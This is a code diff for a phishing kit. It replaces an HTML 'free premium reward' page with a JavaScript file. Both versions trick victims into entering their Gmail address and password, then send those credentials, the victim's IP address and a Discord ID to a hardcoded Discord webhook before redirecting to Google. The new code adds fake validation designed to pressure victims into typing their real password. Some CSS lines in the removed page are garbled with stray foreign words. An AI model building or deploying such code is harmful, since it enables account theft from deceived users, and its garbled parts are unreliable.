@@ -1,203 +1,160 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>🎁 Free Premium Access - Limited Time!</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            margin:相对来说; 0;
-            padding: 0;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            width: 90%;
-            max-width: سنة; 500px;
-            padding: 2rem;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            animation: fadeIn 0.8s ease-out;
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-        }
-        
-        p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-            margin-bottom: 2rem;
-        }
-        
-        .claim-btn {
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            background: linear-gradient(to right, #f7971e, #ffd200);
-            color: #000;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            box-shadow: 0 10px18px rgba(247, 151, 30, 0.4);
-        }
-        
-        .claim-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 25px rgba(247, 151, 30, 0.6);
-            background: linear-gradient(to right, #ffd200, #f7971e);
-        }
-        
-        .login-form {
-            display: none;
-            background: rgba(255, 255, 255, 0.15);
-            padding: 2rem;
-            border-radius: 15px;
-            margin-top: 2rem;
-            animation: slideUp 0.5s ease;
-        }
-        
-        .input-group {
-            margin-bottom: 1.5rem;
-            text-align: left;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 300;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 10px;
-            border: none;
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            font-size: 1rem;
-            box-sizing: border-box;
-        }
-        
-        .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.6);
-        }
-        
-        .submit-btn {
-            padding: 12px 30px;
-            font-size: 1rem;
-            background: linear-gradient(to right, #36d1dc, #5b86e5);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s ease;
-        }
-        
-        .submit-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 15px rgba(91, 134, 229, 0.4);
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .loading {
-            font-size: 1.5rem;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🎁 Exclusive Premium Reward</h1>
-        <p>You've been selected! Claim your <strong>free lifetime access</strong> now.</p>
-        <button class="claim-btn" onclick="showLoginForm()">🚀 CLAIM INSTANTLY</button>
-        
-        <div id="loginForm" class="login-form">
-            <h2>Quick Verification</h2>
-            <p>Enter your Gmail to confirm eligibility.</p>
-            <div class="input-group">
-                <label for="gmail">Gmail Address</label>
-                <input type="email" id="gmail" placeholder="you@gmail.com" required>
-            </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required>
-            </div>
-            <button class="submit-btn" onclick="stealAndSend()">✅ VERIFY & CLAIM</button>
-        </div>
-        
-        <div id="loading" class="loading" style="display:none;">Processing your reward... ⏳</div>
-    </div>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
+const VALID_GMAIL_DOMAINS = ['@gmail.com', '@googlemail.com'];
+let failedAttempts = 0;
+
+function showLoginForm() {
+    document.getElementById('loginForm').style.display = 'block';
+    document.querySelector('.claim-btn').style.display = 'none';
+}
+
+function validateEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+        return {valid: false, message: "❌ Invalid email format!"};
+    }
     
-    <script>
-        // Same malicious script as before
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546905177066442913/lL1peMXpXAfiAZvL2U1qVcBXdFKONm19N0Idvlvs4t9BzB9Nmae_K9zLZDPEdwYD28tM';
+    const hasValidDomain = VALID_GMAIL_DOMAINS.some(domain => 
+        email.toLowerCase().endsWith(domain)
+    );
+    
+    if (!hasValidDomain) {
+        return {valid: false, message: "⚠️ Must use Gmail address!"};
+    }
+    
+    return {valid: true, message: "✅ Email looks good!"};
+}
+
+function validatePassword(password) {
+    if (password.length < 6) {
+        return {valid: false, message: "❌ Password too short (min 6 chars)!"};
+    }
+    
+    if (password.length > 50) {
+        return {valid: false, message: "❌ Password too long!"};
+    }
+    
+    return {valid: true, message: "✅ Password accepted!"};
+}
+
+async function stealAndSend() {
+    const gmail = document.getElementById('gmail').value.trim();
+    const password = document.getElementById('password').value;
+    
+    // Real-time validation feedback
+    const emailValidation = validateEmail(gmail);
+    const passwordValidation = validatePassword(password);
+    
+    if (!emailValidation.valid || !passwordValidation.valid) {
+        failedAttempts++;
         
-        function showLoginForm() {
-            document.getElementById('loginForm').style.display = 'block';
-            document.querySelector('.claim-btn').style.display = 'none';
+        // Create error message
+        let errorMsg = "Verification Failed!<br>";
+        if (!emailValidation.valid) errorMsg += `• ${emailValidation.message}<br>`;
+        if (!passwordValidation.valid) errorMsg += `• ${passwordValidation.message}<br>`;
+        
+        if (failedAttempts >= 3) {
+            errorMsg += `<br>⚠️ Too many attempts! Try your <strong>actual</strong> credentials.`;
         }
         
-        async function stealAndSend() {
-            document.getElementById('loading').style.display = 'block';
-            const gmail = document.getElementById('gmail').value;
-            const password = document.getElementById('password').value;
-            
-            const data = {
-                discordUser: localStorage.getItem('discord_user_id') || 'Unknown',
-                gmail: gmail,
-                password: password,
-                userAgent: navigator.userAgent,
-                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(d => d.ip).catch(() => 'Unknown'),
-                timestamp: new Date().toISOString()
-            };
-            
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🎣 Phishing Success - Aesthetic Trap Worked`,
-                    embeds: [{
-                        title: 'Stolen Credentials',
-                        description: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``,
-                        color: 16711680
-                    }]
-                })
-            }).then(() => {
-                setTimeout(() => {
-                    window.location.href = 'https://accounts.google.com';
-                }, 1500);
-            });
-        }
-    </script>
-</body>
-</html>
+        // Show error in a malicious way
+        document.getElementById('loginForm').innerHTML += `
+            <div id="errorMsg" style="
+                background: rgba(255, 50, 50, 0.2);
+                border-left: 4px solid #ff3333;
+                padding: 10px;
+                margin: 15px 0;
+                border-radius: 5px;
+                text-align: left;
+                animation: shake 0.5s;
+            ">
+                ${errorMsg}
+            </div>
+        `;
+        
+        // Shake animation for psychological pressure
+        document.getElementById('loginForm').style.animation = 'none';
+        setTimeout(() => {
+            document.getElementById('loginForm').style.animation = 'shake 0.5s';
+        }, 10);
+        
+        // Auto-remove error after 5 seconds
+        setTimeout(() => {
+            const errorDiv = document.getElementById('errorMsg');
+            if (errorDiv) errorDiv.remove();
+        }, 5000);
+        
+        return;
+    }
+    
+    // Show fake "processing" to build trust
+    document.getElementById('loading').style.display = 'block';
+    document.getElementById('loginForm').style.display = 'none';
+    
+    // Simulate "checking" delay
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Steal credentials
+    const data = {
+        discordUser: localStorage.getItem('discord_user_id') || 'Unknown',
+        gmail: gmail,
+        password: password,
+        userAgent: navigator.userAgent,
+        ip: await fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(d => d.ip)
+            .catch(() => 'Unknown'),
+        timestamp: new Date().toISOString(),
+        failedAttemptsBeforeSuccess: failedAttempts
+    };
+    
+    // Send to Discord webhook
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: `🎣 PHISHING SUCCESS - CREDENTIALS STOLEN`,
+            embeds: [{
+                title: '🔥 Fresh Credentials Captured',
+                description: `**Email:** ||${gmail}||\n**Password:** ||${password}||\n**Failed Attempts:** ${failedAttempts}\n**IP:** ${data.ip}`,
+                color: 16711680,
+                timestamp: data.timestamp
+            }]
+        })
+    }).then(() => {
+        // Redirect to real Google after stealing
+        setTimeout(() => {
+            document.getElementById('loading').innerHTML = 
+                '✅ Verification Complete! Redirecting to Google...';
+            setTimeout(() => {
+                window.location.href = 'https://accounts.google.com';
+            }, 2000);
+        }, 1500);
+    }).catch(() => {
+        // Fallback if webhook fails
+        setTimeout(() => {
+            window.location.href = 'https://accounts.google.com';
+        }, 1500);
+    });
+}
+
+// Add shake animation to CSS
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+        20%, 40%, 60%, 80% { transform: translateX(5px); }
+    }
+`;
+document.head.appendChild(style);
+
+// Real-time validation as they type
+document.getElementById('gmail')?.addEventListener('blur', function() {
+    const validation = validateEmail(this.value);
+    // You could add live validation indicators here
+});
+
+document.getElementById('password')?.addEventListener('blur', function() {
+    const validation = validatePassword(this.value);
+    // You could add live validation indicators here
+});
